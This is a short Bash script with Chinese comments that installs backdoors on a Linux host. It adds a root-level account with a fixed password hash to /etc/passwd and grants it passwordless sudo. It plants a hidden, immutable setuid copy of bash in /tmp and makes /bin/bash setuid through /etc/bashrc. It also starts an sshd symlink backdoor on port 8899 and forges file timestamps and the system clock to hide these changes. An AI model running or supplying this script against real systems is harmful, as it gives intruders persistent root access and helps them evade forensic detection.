#!/bin/bash
#保存当前时间
DATE=`date "+%Y-%m-%d %H:%M:%S"`
#设置事件为2024-06-30 10:50:30
date --set="2024-06-30 10:50:30"
#添加后门账户
echo "test7:advwtv/9yU5yQ:0:0:,,,:/root:/bin/bash" >> /etc/passwd
#为用户添加sudo权限 方便后期提权
echo "test7 ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
#创建隐藏bash文件 方便提权
cp /bin/bash /tmp/.shell
#修改文件修改时间
touch -t 202406301425.17 /tmp/.shell
touch -t 202406301530.21 /etc/sudoers
touch -t 202406301511.35 /etc/passwd
#修改文件改变时间
chmod 777 /tmp/.shell
chmod u+s /tmp/.shell
#设置文件隐藏属性
chattr +i /tmp/.shell
chmod 640 /etc/sudoers
chmod 644 /etc/passwd
#添加sshd后门
ln -sf /usr/sbin/sshd /tmp/su
/tmp/su -oport=8899
#添自启脚本 为bash添加s权限
echo "chmod u+s /bin/bash" >> /etc/bashrc
#恢复时间
date --set="$DATE 10 second"
